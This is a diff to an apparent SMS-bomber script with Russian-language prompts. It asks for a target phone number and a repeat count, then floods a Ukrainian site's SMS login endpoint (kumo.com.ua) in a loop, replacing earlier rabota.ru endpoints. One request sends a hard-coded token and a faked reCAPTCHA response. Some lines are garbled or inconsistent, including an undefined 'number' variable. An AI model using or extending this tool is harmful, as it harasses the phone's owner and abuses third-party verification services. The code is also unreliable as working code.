@@ -44,13 +44,21 @@ NUMBER = input('[green]Beeante HOMeP tenedona: (бes + ')
 
 run = int(console.input('[green]Введите количество повторов (1-35):\n[blue]spammer>> '))
 for _ in track(range(run)):
+
  try:
-     print('1')
-     response = requests.post('https://www.rabota.ru/remind', headers=headers, json={'phone': "+" + NUMBER})
+     print('3')
+     formatted_phone = format_phone(number, "+###+##+###+##+##")
+     requests.post("https://kumo.com.ua/login/sms/", data={"phone": "+" + NUMBER, "_token": "bXjwBMo8eSTiyWpex3QEOqwblgWabMYTPK2uyZ7m", "g-recaptcha-response": "1"}, headers=headers)
  except:
-     print('11')
+     print('33')
  try:
-     print('2')
-     response = requests.post('https://www.rabota.ru/api-web/v6/code/send.json', headers=headers, json={'phone': "+" + NUMBER})
+     print('4')
+     formatted_phone = format_phone(number, "+###+##+###+##+##")
+     requests.post("https://kumo.com.ua/login/sms/", data={"phone": "+" + NUMBER}, headers=headers)
  except:
-     print('22')
+     print('44')
+ try:
+     print('5')
+     requests.post("https://kumo.com.ua/login/sms/", data={"phone": "+" + NUMBER}, headers=headers)
+ except:
+     print('55')
